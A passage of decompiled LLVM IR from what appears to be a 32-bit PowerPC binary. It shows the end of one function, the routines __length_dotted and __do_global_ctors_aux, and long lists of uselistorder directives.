  %v0_1002881c = phi i32 [ %v0_1002881c.pre, %dec_label_pc_100287f8 ], [ -1, %dec_label_pc_10028808 ]
  store i32 %v0_10028758, i32* %r0.global-to-local, align 4
  ret i32 %v0_1002881c

; uselistorder directives
  uselistorder i32 %v0_100287e414, { 1, 0 }
  uselistorder i32 %v0_100287d4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_100287c0, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10028790, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 ()* @memcpy, { 20, 6, 17, 16, 19, 47, 46, 39, 38, 3, 51, 11, 10, 0, 5, 4, 37, 36, 35, 13, 15, 14, 45, 44, 43, 42, 41, 40, 1, 18, 9, 8, 7, 50, 34, 2, 49, 48, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 12 }
  uselistorder i32 16777216, { 4, 3, 5, 6, 8, 7, 0, 1, 2 }
  uselistorder i32 ()* @__GI_strlen, { 38, 93, 99, 98, 97, 96, 95, 36, 94, 92, 91, 102, 101, 37, 22, 21, 18, 100, 90, 2, 89, 3, 88, 87, 4, 86, 8, 7, 85, 84, 83, 6, 5, 82, 81, 80, 13, 79, 12, 78, 77, 11, 76, 10, 75, 9, 74, 73, 0, 72, 42, 14, 41, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 20, 19, 52, 51, 50, 49, 48, 47, 44, 46, 45, 15, 43, 30, 29, 16, 28, 27, 26, 17, 25, 24, 23, 40, 39, 35, 1, 34, 32, 33, 31 }
  uselistorder i32* @r30, { 256, 11, 257, 150, 12, 95, 96, 97, 259, 261, 262, 263, 264, 265, 258, 260, 266, 267, 268, 269, 270, 271, 272, 273, 276, 277, 278, 122, 123, 13, 45, 124, 125, 46, 356, 41, 333, 334, 126, 127, 128, 131, 132, 335, 341, 342, 98, 99, 357, 358, 359, 14, 360, 361, 362, 403, 404, 405, 406, 407, 182, 183, 279, 280, 281, 287, 288, 289, 290, 42, 291, 292, 293, 298, 299, 300, 301, 302, 274, 275, 100, 101, 102, 103, 104, 105, 106, 107, 108, 15, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 1, 338, 339, 340, 16, 129, 17, 130, 160, 161, 336, 337, 10, 133, 134, 135, 136, 137, 138, 139, 142, 140, 141, 143, 146, 144, 145, 43, 147, 148, 149, 151, 152, 416, 417, 153, 154, 155, 418, 419, 156, 157, 158, 159, 162, 163, 164, 343, 344, 345, 346, 347, 348, 57, 58, 19, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 18, 73, 71, 72, 74, 75, 76, 349, 350, 351, 352, 353, 354, 355, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 20, 21, 177, 178, 22, 179, 180, 363, 364, 365, 366, 367, 368, 369, 23, 370, 371, 372, 373, 374, 24, 430, 431, 432, 433, 25, 434, 461, 472, 462, 463, 435, 249, 250, 251, 252, 253, 254, 26, 255, 181, 0, 326, 27, 327, 328, 440, 441, 442, 443, 420, 421, 425, 422, 423, 424, 408, 409, 410, 411, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 247, 203, 204, 205, 2, 206, 207, 208, 9, 209, 210, 297, 294, 295, 7, 296, 6, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 3, 28, 88, 89, 90, 91, 92, 93, 94, 464, 465, 466, 467, 468, 469, 470, 29, 471, 375, 30, 376, 377, 378, 379, 315, 31, 316, 317, 284, 282, 283, 285, 318, 319, 321, 320, 8, 322, 323, 324, 325, 32, 286, 380, 381, 382, 383, 384, 4, 386, 47, 387, 33, 388, 389, 385, 390, 391, 392, 393, 394, 395, 396, 34, 397, 398, 5, 399, 400, 401, 402, 439, 436, 44, 246, 332, 242, 243, 244, 245, 248, 239, 35, 457, 225, 226, 227, 228, 229, 444, 446, 445, 448, 447, 211, 212, 213, 214, 215, 415, 412, 413, 414, 216, 217, 218, 219, 220, 221, 222, 223, 36, 224, 230, 437, 438, 427, 429, 458, 459, 460, 48, 49, 50, 51, 52, 53, 54, 55, 56, 231, 449, 450, 451, 453, 37, 452, 232, 233, 234, 235, 236, 38, 428, 39, 426, 454, 455, 40, 456, 237, 238, 240, 241, 329, 330, 331 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 46, { 0, 4, 1, 3, 5, 2 }
  uselistorder i8* null, { 0, 1, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder i32* @r28, { 159, 160, 161, 162, 99, 100, 167, 168, 163, 164, 165, 166, 169, 170, 171, 172, 173, 174, 175, 176, 177, 180, 90, 8, 91, 92, 234, 235, 236, 272, 237, 238, 273, 274, 275, 276, 277, 278, 279, 280, 281, 105, 106, 0, 186, 187, 188, 189, 195, 196, 197, 9, 178, 179, 68, 69, 10, 70, 71, 72, 3, 73, 74, 75, 76, 77, 78, 4, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 93, 94, 95, 96, 97, 98, 101, 102, 103, 285, 286, 29, 104, 5, 27, 31, 11, 6, 290, 291, 239, 12, 240, 241, 242, 243, 244, 13, 292, 293, 294, 307, 314, 14, 155, 156, 157, 30, 158, 226, 303, 304, 305, 306, 287, 288, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 198, 199, 200, 201, 202, 203, 204, 121, 15, 120, 122, 123, 124, 125, 126, 127, 190, 194, 191, 192, 193, 7, 32, 16, 33, 34, 35, 36, 17, 37, 18, 38, 39, 40, 41, 42, 43, 19, 44, 45, 46, 47, 48, 49, 20, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 21, 63, 64, 308, 309, 310, 311, 312, 181, 182, 245, 246, 183, 22, 184, 185, 205, 206, 207, 208, 209, 210, 247, 248, 249, 23, 250, 251, 24, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 1, 268, 269, 65, 66, 67, 270, 271, 313, 211, 212, 213, 214, 215, 25, 216, 26, 217, 218, 219, 220, 221, 222, 223, 232, 233, 145, 224, 225, 142, 137, 138, 295, 296, 297, 302, 298, 299, 301, 128, 129, 282, 283, 284, 130, 131, 132, 133, 134, 135, 2, 136, 289, 28, 139, 140, 141, 227, 228, 300, 143, 144, 229, 230, 231, 146, 147, 148, 149, 150, 151, 152, 153, 154 }
  uselistorder i32* @r5, { 193, 194, 9, 42, 195, 196, 4, 50, 224, 253, 220, 53, 48, 225, 258, 254, 199, 200, 205, 206, 207, 197, 43, 44, 45, 46, 47, 5, 6, 222, 49, 51, 52, 221, 54, 55, 260, 56, 57, 259, 58, 59, 15, 16, 223, 60, 139, 7, 208, 2, 209, 226, 227, 228, 229, 230, 231, 232, 262, 110, 233, 234, 235, 236, 237, 238, 280, 287, 181, 182, 261, 75, 160, 255, 256, 61, 62, 63, 64, 65, 66, 67, 68, 210, 211, 69, 70, 201, 202, 204, 203, 166, 167, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 267, 268, 269, 270, 271, 272, 274, 71, 140, 198, 239, 240, 241, 281, 282, 283, 284, 285, 286, 275, 276, 3, 277, 278, 279, 212, 242, 243, 245, 244, 246, 0, 247, 248, 249, 250, 251, 263, 264, 213, 214, 217, 218, 104, 105, 118, 106, 252, 219, 215, 8, 72, 73, 265, 266, 273, 74, 257, 10, 11, 12, 76, 1, 77, 78, 38, 39, 40, 41, 111, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 107, 108, 109, 112, 113, 114, 115, 116, 117, 13, 14, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 161, 162, 163, 164, 165, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 216 }
  uselistorder i32* @r29, { 241, 242, 243, 68, 69, 70, 71, 72, 73, 74, 4, 244, 32, 245, 246, 247, 248, 249, 251, 250, 252, 253, 254, 257, 258, 259, 98, 99, 5, 338, 339, 340, 375, 6, 328, 260, 261, 262, 341, 342, 383, 378, 379, 380, 381, 129, 263, 264, 265, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 289, 290, 291, 292, 255, 256, 75, 76, 7, 1, 77, 78, 79, 80, 82, 81, 83, 84, 85, 86, 8, 2, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 0, 326, 327, 100, 101, 102, 103, 104, 106, 105, 107, 108, 109, 388, 110, 111, 9, 112, 10, 113, 114, 115, 116, 117, 118, 119, 120, 11, 389, 121, 329, 45, 12, 46, 330, 331, 332, 333, 334, 335, 336, 337, 123, 122, 124, 125, 126, 127, 128, 409, 410, 344, 345, 346, 343, 347, 40, 348, 349, 13, 350, 351, 352, 353, 354, 355, 411, 412, 413, 414, 415, 376, 377, 14, 239, 322, 323, 416, 417, 418, 419, 420, 15, 421, 427, 428, 429, 390, 391, 392, 393, 394, 382, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 41, 144, 145, 293, 294, 295, 296, 297, 16, 298, 299, 17, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 18, 281, 282, 283, 284, 285, 286, 287, 288, 19, 233, 234, 20, 235, 236, 37, 237, 21, 22, 47, 48, 49, 50, 51, 52, 53, 54, 55, 437, 438, 439, 266, 267, 356, 357, 23, 358, 359, 360, 361, 268, 269, 33, 270, 300, 301, 302, 303, 304, 42, 24, 3, 305, 306, 307, 308, 362, 363, 364, 365, 366, 367, 368, 371, 25, 31, 26, 372, 56, 369, 370, 373, 374, 440, 441, 442, 443, 309, 310, 311, 312, 313, 314, 315, 27, 316, 210, 207, 317, 318, 319, 320, 321, 199, 433, 434, 34, 35, 435, 179, 180, 181, 422, 423, 426, 430, 28, 431, 159, 160, 161, 162, 163, 29, 164, 165, 166, 167, 168, 169, 36, 170, 384, 385, 386, 387, 171, 172, 173, 174, 175, 57, 58, 176, 177, 30, 178, 59, 60, 400, 401, 402, 403, 404, 38, 182, 39, 183, 184, 185, 186, 187, 61, 62, 63, 64, 65, 432, 66, 67, 405, 406, 407, 408, 188, 189, 190, 395, 396, 397, 398, 399, 191, 192, 193, 194, 195, 196, 197, 198, 436, 200, 216, 217, 424, 425, 208, 209, 324, 325, 201, 202, 203, 204, 205, 206, 43, 44, 211, 212, 213, 214, 215, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 238, 240 }
  uselistorder i32* @r31, { 12, 377, 11, 378, 379, 207, 94, 208, 212, 146, 147, 148, 149, 209, 13, 210, 211, 380, 14, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 393, 394, 395, 396, 397, 181, 182, 183, 184, 185, 218, 219, 555, 15, 556, 511, 512, 513, 186, 187, 188, 193, 194, 514, 515, 524, 16, 525, 526, 133, 134, 150, 151, 152, 153, 17, 527, 18, 557, 558, 559, 560, 561, 398, 19, 399, 400, 401, 402, 20, 403, 404, 405, 406, 407, 408, 562, 563, 564, 565, 566, 567, 568, 569, 570, 21, 571, 169, 22, 170, 528, 529, 623, 624, 625, 626, 627, 628, 629, 630, 239, 240, 23, 410, 409, 4, 412, 413, 428, 429, 430, 431, 432, 433, 392, 5, 84, 154, 155, 156, 157, 158, 159, 160, 161, 162, 166, 163, 164, 165, 168, 167, 171, 172, 173, 174, 175, 176, 177, 178, 516, 520, 521, 189, 190, 191, 192, 24, 224, 517, 518, 519, 179, 180, 195, 196, 199, 197, 198, 200, 201, 202, 203, 204, 205, 206, 213, 214, 215, 216, 217, 638, 639, 86, 220, 6, 221, 640, 641, 222, 223, 522, 523, 225, 226, 227, 228, 229, 530, 531, 532, 533, 534, 230, 231, 232, 233, 535, 536, 537, 538, 539, 25, 26, 135, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 353, 354, 355, 356, 414, 27, 415, 416, 28, 417, 418, 29, 419, 420, 572, 573, 574, 575, 576, 577, 578, 579, 30, 580, 581, 582, 583, 31, 584, 32, 585, 586, 587, 85, 588, 0, 670, 671, 672, 33, 87, 673, 75, 674, 34, 675, 676, 677, 678, 679, 680, 681, 682, 88, 740, 741, 82, 370, 683, 684, 371, 372, 373, 374, 375, 376, 234, 235, 236, 237, 238, 502, 503, 7, 699, 700, 701, 702, 703, 704, 705, 711, 642, 651, 643, 644, 645, 35, 646, 647, 648, 649, 650, 336, 337, 338, 339, 36, 631, 632, 633, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 446, 447, 448, 38, 449, 450, 451, 37, 452, 453, 454, 455, 456, 352, 89, 258, 39, 76, 40, 41, 259, 260, 261, 262, 434, 435, 436, 437, 1, 438, 439, 440, 441, 442, 443, 444, 445, 365, 366, 367, 368, 369, 136, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 42, 411, 589, 590, 591, 592, 593, 457, 458, 459, 44, 460, 43, 461, 421, 422, 423, 45, 424, 425, 426, 462, 463, 464, 465, 466, 46, 83, 8, 467, 468, 469, 470, 47, 427, 48, 49, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 52, 51, 611, 50, 615, 616, 53, 617, 618, 619, 620, 137, 138, 613, 612, 614, 621, 54, 622, 685, 55, 686, 90, 56, 77, 687, 688, 689, 690, 691, 692, 693, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 483, 482, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 348, 349, 350, 344, 345, 346, 347, 497, 498, 499, 500, 57, 58, 501, 59, 293, 357, 358, 340, 263, 264, 265, 266, 267, 268, 269, 270, 730, 731, 78, 2, 60, 732, 733, 294, 295, 296, 297, 298, 61, 299, 300, 301, 74, 709, 710, 3, 706, 707, 708, 712, 713, 91, 271, 79, 272, 80, 273, 637, 634, 635, 62, 636, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 63, 284, 285, 286, 287, 290, 291, 292, 288, 64, 289, 302, 303, 694, 695, 696, 697, 698, 657, 658, 667, 9, 668, 669, 737, 738, 739, 95, 65, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 10, 304, 306, 66, 67, 68, 305, 139, 140, 141, 142, 143, 144, 145, 326, 327, 307, 308, 714, 715, 718, 719, 720, 721, 722, 723, 724, 725, 726, 716, 69, 717, 309, 310, 311, 312, 659, 660, 661, 662, 663, 666, 313, 314, 315, 316, 317, 318, 655, 652, 653, 654, 81, 656, 664, 70, 665, 728, 71, 729, 92, 727, 319, 320, 321, 322, 323, 324, 325, 328, 329, 330, 331, 332, 72, 359, 360, 73, 364, 361, 362, 363, 504, 505, 506, 507, 508, 509, 333, 334, 335, 734, 735, 736, 341, 342, 343, 93, 351, 510 }
  uselistorder label %dec_label_pc_1002880c, { 1, 0 }
  uselistorder label %dec_label_pc_10028808, { 1, 0 }
  uselistorder label %dec_label_pc_100287f0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100287e4, { 1, 0 }
  uselistorder label %dec_label_pc_10028794, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_10028820 = load i32, i32* @r3, align 4
  store i32 %v0_10028820, i32* %r11.global-to-local, align 4
  %v3_10028820 = icmp eq i32 %v0_10028820, 0
  %v0_10028828 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10028820, i32 %v0_10028828)
  %v0_10028838 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10028844

dec_label_pc_10028830:                            ; preds = %dec_label_pc_10028840
  %v1_10028830 = add i32 %v1_10028844, 2
  br label %dec_label_pc_10028860

dec_label_pc_10028840:                            ; preds = %dec_label_pc_10028844
  %v2_10028858 = add i32 %v1_10028848, %v5_10028844
  %v3_10028854 = icmp eq i32 %v1_10028850, 192
  br i1 %v3_10028854, label %dec_label_pc_10028830, label %dec_label_pc_10028844

dec_label_pc_10028844:                            ; preds = %dec_label_pc_10028840, %entry
  %v1_10028844 = phi i32 [ %v2_10028858, %dec_label_pc_10028840 ], [ %v0_10028838, %entry ]
  %v0_10028844 = load i32, i32* %r11.global-to-local, align 4
  %v2_10028844 = add i32 %v0_10028844, %v1_10028844
  %v3_10028844 = inttoptr i32 %v2_10028844 to i8*
  %v4_10028844 = load i8, i8* %v3_10028844, align 1
  %v5_10028844 = zext i8 %v4_10028844 to i32
  %v1_10028848 = add i32 %v1_10028844, 1
  %v3_1002884c = icmp eq i8 %v4_10028844, 0
  %v1_10028850 = call i32 @__asm_rlwinm(i32 %v5_10028844, i32 0, i32 24, i32 25)
  br i1 %v3_1002884c, label %dec_label_pc_10028860, label %dec_label_pc_10028840

dec_label_pc_10028860:                            ; preds = %dec_label_pc_10028844, %dec_label_pc_10028830
  %v1_10028860 = phi i32 [ %v1_10028830, %dec_label_pc_10028830 ], [ %v1_10028848, %dec_label_pc_10028844 ]
  %v0_10028860 = load i32, i32* @r4, align 4
  %v2_10028860 = sub i32 %v1_10028860, %v0_10028860
  ret i32 %v2_10028860

; uselistorder directives
  uselistorder i32 %v1_10028848, { 1, 0 }
  uselistorder i32 %v5_10028844, { 1, 0 }
  uselistorder i32 %v1_10028844, { 2, 1, 0 }
  uselistorder i32 %v0_10028820, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 82, 85, 86, 87, 88, 89, 90, 91, 92, 26, 27, 93, 32, 28, 29, 123, 124, 83, 84, 30, 31, 33, 34, 35, 1, 2, 103, 104, 37, 36, 94, 105, 106, 107, 69, 70, 71, 127, 128, 138, 126, 72, 67, 68, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 139, 140, 141, 108, 95, 96, 97, 50, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 98, 99, 100, 101, 102, 65, 131, 132, 133, 134, 135, 38, 39, 40, 41, 42, 125, 129, 0, 43, 47, 44, 136, 137, 45, 46, 130, 48, 49, 66, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 73, 74, 75, 76, 77, 78, 79, 80, 81, 142 }
  uselistorder i32 25, { 6, 8, 9, 10, 7, 0, 12, 11, 13, 3, 4, 5, 1, 2 }
  uselistorder i32 24, { 73, 74, 76, 77, 78, 79, 80, 81, 82, 96, 83, 84, 89, 75, 22, 23, 24, 25, 26, 10, 95, 4, 85, 86, 87, 97, 27, 94, 28, 29, 30, 62, 63, 64, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 98, 90, 88, 91, 92, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 93, 36, 113, 112, 5, 6, 7, 8, 9, 31, 109, 32, 33, 34, 35, 37, 0, 38, 1, 39, 40, 41, 2, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 65, 66, 67, 68, 69, 3, 70, 71, 72 }
  uselistorder i8 0, { 59, 60, 61, 62, 63, 41, 67, 65, 40, 66, 64, 39, 68, 70, 69, 42, 16, 71, 72, 17, 73, 74, 38, 44, 77, 75, 76, 43, 78, 79, 56, 15, 80, 12, 82, 81, 83, 84, 85, 86, 87, 89, 88, 45, 90, 91, 1, 92, 93, 94, 18, 95, 96, 97, 19, 98, 99, 3, 2, 102, 100, 47, 101, 4, 46, 103, 5, 20, 0, 21, 104, 22, 105, 23, 11, 24, 106, 107, 108, 110, 111, 112, 113, 109, 114, 25, 115, 116, 117, 118, 26, 27, 28, 29, 30, 120, 121, 122, 123, 119, 124, 13, 31, 32, 33, 34, 35, 36, 125, 127, 126, 37, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 6, 140, 141, 142, 143, 144, 145, 146, 57, 7, 147, 148, 149, 151, 150, 48, 152, 153, 154, 155, 156, 8, 157, 158, 159, 160, 161, 162, 163, 164, 9, 165, 166, 169, 167, 168, 14, 170, 171, 172, 10, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 188, 186, 187, 189, 190, 191, 192, 193, 196, 195, 49, 194, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 55, 210, 211, 214, 212, 213, 215, 218, 216, 217, 219, 220, 221, 222, 224, 225, 223, 50, 226, 227, 52, 228, 51, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 54, 254, 53, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 271, 270, 58, 272, 273, 274 }
  uselistorder i32 192, { 0, 1, 3, 2, 4 }
  uselistorder i32 2, { 0, 348, 349, 318, 114, 319, 320, 52, 2, 3, 4, 5, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 6, 333, 248, 249, 250, 97, 98, 364, 99, 115, 350, 116, 351, 7, 254, 117, 118, 119, 242, 243, 365, 366, 244, 355, 356, 383, 120, 102, 101, 100, 103, 257, 8, 9, 10, 11, 121, 341, 12, 353, 354, 251, 252, 352, 245, 246, 357, 247, 122, 123, 253, 1, 49, 255, 124, 358, 104, 359, 125, 126, 218, 105, 106, 360, 361, 362, 363, 127, 65, 256, 13, 53, 334, 335, 66, 367, 368, 14, 369, 370, 371, 15, 67, 69, 68, 70, 128, 129, 130, 131, 71, 72, 132, 133, 300, 134, 301, 135, 302, 303, 385, 54, 16, 17, 136, 137, 138, 139, 140, 18, 107, 258, 259, 260, 261, 262, 263, 264, 265, 112, 113, 141, 142, 342, 108, 19, 20, 21, 266, 267, 268, 55, 50, 336, 337, 338, 339, 340, 143, 295, 296, 219, 220, 221, 22, 222, 23, 144, 223, 224, 24, 145, 225, 226, 227, 25, 228, 229, 26, 146, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 390, 27, 28, 29, 30, 56, 57, 58, 59, 60, 147, 61, 62, 372, 373, 63, 343, 344, 374, 375, 376, 31, 32, 33, 34, 35, 377, 378, 36, 380, 381, 382, 48, 379, 345, 148, 149, 150, 37, 109, 389, 391, 38, 269, 270, 271, 272, 273, 386, 151, 384, 388, 387, 39, 64, 73, 74, 152, 274, 40, 153, 275, 110, 51, 76, 154, 155, 42, 41, 111, 157, 156, 276, 159, 158, 161, 160, 162, 163, 164, 277, 278, 165, 75, 279, 166, 167, 168, 43, 169, 170, 44, 171, 172, 77, 173, 174, 175, 280, 78, 45, 281, 177, 176, 282, 179, 178, 181, 180, 182, 184, 283, 183, 284, 185, 79, 187, 80, 285, 186, 81, 188, 82, 189, 286, 287, 83, 190, 84, 191, 288, 289, 192, 85, 193, 194, 290, 291, 86, 195, 87, 196, 292, 293, 197, 294, 88, 198, 199, 89, 200, 90, 201, 297, 91, 202, 92, 203, 204, 93, 205, 94, 206, 298, 299, 95, 207, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 96, 208, 317, 210, 209, 346, 46, 47, 211, 212, 347, 213, 214, 215, 216, 217 }
  uselistorder i32* @r4, { 360, 361, 362, 363, 113, 6, 435, 436, 437, 438, 364, 365, 366, 367, 13, 14, 105, 106, 114, 451, 483, 28, 107, 108, 111, 29, 439, 442, 372, 373, 374, 375, 376, 377, 70, 71, 72, 73, 74, 75, 76, 7, 443, 453, 92, 93, 454, 77, 78, 484, 444, 488, 491, 485, 378, 379, 380, 382, 384, 385, 386, 387, 11, 388, 393, 394, 395, 396, 397, 398, 399, 400, 1, 368, 369, 370, 371, 2, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 3, 89, 90, 91, 94, 95, 96, 97, 98, 99, 100, 101, 36, 440, 109, 110, 102, 103, 104, 445, 112, 115, 15, 492, 116, 117, 16, 441, 17, 118, 119, 446, 447, 448, 18, 120, 121, 122, 19, 449, 37, 38, 39, 4, 40, 450, 123, 124, 125, 289, 290, 291, 20, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 524, 526, 511, 342, 343, 344, 505, 345, 346, 126, 428, 429, 430, 127, 128, 431, 493, 506, 490, 347, 348, 349, 177, 21, 164, 320, 22, 23, 486, 487, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 401, 402, 408, 144, 145, 389, 390, 392, 391, 327, 328, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 12, 60, 61, 62, 512, 513, 514, 515, 516, 517, 522, 146, 381, 8, 465, 466, 467, 24, 468, 469, 403, 404, 405, 406, 407, 409, 410, 411, 9, 10, 525, 523, 470, 412, 413, 414, 415, 416, 417, 418, 383, 188, 471, 472, 473, 474, 0, 475, 476, 477, 478, 479, 480, 481, 497, 419, 420, 421, 234, 235, 237, 432, 433, 225, 226, 227, 247, 434, 482, 422, 423, 424, 25, 147, 148, 510, 452, 518, 519, 520, 521, 149, 150, 151, 152, 153, 507, 498, 154, 26, 489, 27, 155, 156, 157, 63, 159, 160, 158, 161, 162, 508, 509, 163, 30, 31, 32, 33, 166, 5, 165, 64, 167, 168, 499, 501, 502, 503, 500, 169, 65, 495, 170, 171, 494, 496, 504, 172, 173, 174, 175, 176, 321, 178, 66, 67, 68, 69, 236, 179, 180, 181, 182, 183, 184, 185, 186, 187, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 228, 229, 230, 231, 232, 233, 238, 239, 240, 241, 242, 243, 244, 245, 246, 248, 249, 250, 251, 34, 35, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 322, 323, 324, 325, 326, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 425, 426, 427 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 15, 16, 17, 18, 19, 20, 21, 10, 0, 35, 36, 1, 11, 28, 29, 30, 31, 32, 22, 14, 37, 26, 9, 5, 6, 7, 8, 33, 24, 25, 23, 40, 39, 34, 27, 12, 13, 38, 2, 3, 4 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100400bc.1441 to i32), i32* %r31.global-to-local, align 4
  %v3_10028884 = load i32, i32* @global_var_100400bc.1441, align 4
  %v3_10028888 = icmp eq i32 %v3_10028884, -1
  br i1 %v3_10028888, label %dec_label_pc_100288a4, label %dec_label_pc_10028890

dec_label_pc_10028890:                            ; preds = %entry, %dec_label_pc_10028890
  %v0_10028890 = phi i32 [ %v3_10028898, %dec_label_pc_10028890 ], [ %v3_10028884, %entry ]
  call void @__pseudo_call(i32 %v0_10028890)
  %v0_10028898 = load i32, i32* %r31.global-to-local, align 4
  %v1_10028898 = add i32 %v0_10028898, -4
  %v2_10028898 = inttoptr i32 %v1_10028898 to i32*
  %v3_10028898 = load i32, i32* %v2_10028898, align 4
  store i32 %v1_10028898, i32* %r31.global-to-local, align 4
  %v3_1002889c = icmp eq i32 %v3_10028898, -1
  br i1 %v3_1002889c, label %dec_label_pc_100288a4, label %dec_label_pc_10028890

dec_label_pc_100288a4:                            ; preds = %dec_label_pc_10028890, %entry
  %v0_100288b4 = load i32, i32* @r3, align 4
  ret i32 %v0_100288b4

; uselistorder directives
  uselistorder i32 %v3_10028898, { 1, 0 }
  uselistorder i32 -4, { 27, 6, 7, 8, 9, 10, 11, 37, 38, 39, 40, 41, 2, 3, 4, 5, 12, 28, 29, 30, 20, 21, 22, 23, 24, 31, 32, 13, 14, 15, 16, 42, 17, 25, 46, 47, 43, 44, 45, 33, 34, 35, 36, 18, 19, 0, 1, 26 }
  uselistorder void (i32)* @__pseudo_call, { 61, 35, 32, 14, 36, 37, 62, 63, 64, 65, 0, 15, 16, 51, 66, 67, 68, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 70, 71, 29, 30, 69, 31, 33, 34, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 72, 73, 74, 1, 2, 3, 4, 5, 6, 7, 8, 75, 9, 52, 53, 77, 76, 81, 82, 59, 58, 79, 10, 11, 54, 78, 12, 80, 55, 60, 56, 57, 13 }
